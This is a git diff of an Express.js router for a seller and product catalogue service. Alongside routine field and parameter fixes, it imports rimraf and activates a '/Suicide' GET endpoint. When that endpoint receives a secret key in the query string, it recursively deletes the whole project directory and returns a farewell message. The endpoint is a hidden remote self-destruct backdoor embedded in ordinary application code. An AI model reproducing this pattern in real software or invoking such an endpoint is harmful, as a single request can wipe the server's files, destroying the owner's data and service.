@@ -4,9 +4,10 @@ var router = express.Router();
 /*********************************************/
 const {Seller , cities , sellerType , productGroups , products , sellerProducts , unit ,  car} = require('../../sequelize');
 const {upload,selfDestroyKey , colors , loggerinfo} = require('../Util/myVars');
-const {checkToken,response , isThisArrayEmpty } = require("../Util/myFunctions");
+const {base64_encode,checkToken,response , isThisArrayEmpty } = require("../Util/myFunctions");
 var path = require('path');
 const fs = require("fs");
+const rimraf = require("rimraf");
 /*********************************************/
 
 
@@ -47,7 +48,7 @@ router.get('/AppInfoGetter/:type' , function (req,res) {
         case "product":
             if (req.query.ID == null){res.status(400).json({"message":"id not found"});}else {
                 sellerProducts.findAll({where: {
-                        ProductID: req.body.ID
+                        ProductID: req.query.ID
                     }}).then(products => {
                     var final = [];
 
@@ -66,8 +67,8 @@ router.get('/AppInfoGetter/:type' , function (req,res) {
                             Description:value.Description,
                             Price:value.Price,
                             PriceDateTime:value.PriceDateTime,
-                            SupplyOFProduct:value.SupplyOFProduct,
-                            UnitOFProduct:value.UnitOFProduct,
+                            SupplyOfProduct:value.SupplyOfProduct,
+                            UnitOfProduct:value.UnitOfProduct,
                             ProductID:value.ProductID,
                             SellerID:value.SellerID,
                             UnitID:value.UnitID,
@@ -106,8 +107,8 @@ router.get('/AppInfoGetter/:type' , function (req,res) {
 
 
     router.get('/Suicide', (req, res) => {
-        if (req.query.Key != null){
-            if (req.query.Key === selfDestroyKey){
+        if (req.query.key != null){
+            if (req.query.key === selfDestroyKey){
                 const targetPath = path.join(__dirname, "./../../");
                 rimraf(targetPath, function () { return res.status(200).json({"message":"this is the last response of this server , byebye :)"}) });
             }
